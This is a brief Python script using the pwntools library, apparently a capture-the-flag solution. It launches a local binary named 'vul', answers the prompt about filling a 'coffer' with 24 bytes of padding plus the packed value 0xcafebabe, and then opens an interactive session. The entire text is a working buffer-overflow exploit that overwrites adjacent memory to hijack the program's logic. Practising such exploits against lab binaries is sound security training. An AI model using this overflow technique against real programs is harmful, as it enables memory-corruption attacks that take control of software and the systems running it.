import pwn

c = pwn.process('./vul')

exploit = b'AAAABBBBCCCCDDDDEEEEFFFF' + pwn.p32(0xcafebabe)

c.sendlineafter('What do you want to fill your coffer with?', exploit)
c.interactive()